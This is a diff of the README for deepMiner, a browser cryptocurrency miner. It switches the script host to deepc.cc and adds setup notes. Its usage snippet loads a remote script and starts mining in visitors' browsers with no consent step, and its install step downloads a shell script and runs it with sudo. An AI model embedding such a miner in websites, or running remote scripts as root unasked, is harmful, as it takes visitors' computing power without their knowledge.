@@ -20,12 +20,12 @@
 
 ## Usage
 
-* Add a script inmport `https://deepminer.herokuapp.com/deepMiner.js`
+* Add a script inmport `https://deepc.cc/deepMiner.js`
 
 * Add another script and write down :
 
 ```html
-<script src="https://deepminer.herokuapp.com/deepMiner.js"></script>
+<script src="https://deepc.cc/deepMiner.js"></script>
 <script>
     var miner = new deepMiner.Anonymous('deepMiner_test').start();
 </script>
@@ -40,9 +40,21 @@ curl https://raw.githubusercontent.com/deepwn/deepMiner/master/install.sh > inst
 sudo sh install.sh
 ```
 
+lib request: `*nodejs` / `*npm` / `?nginx`
+
+useful pakages: `forever`
+
+ssl support: <https://certbot.eff.org/>
+
+OS pass: `ubuntu(debian)`
+
+## SSL support
+
+https://certbot.eff.org/
+
 ## Example
 
-<https://deepminer.herokuapp.com/demo.html>
+<https://deepc.cc/demo.html>
 
 ## Source
 
@@ -68,4 +80,4 @@ deepMiner.git
 
 ## Latest
 
-2017-10-10
+2017-10-12
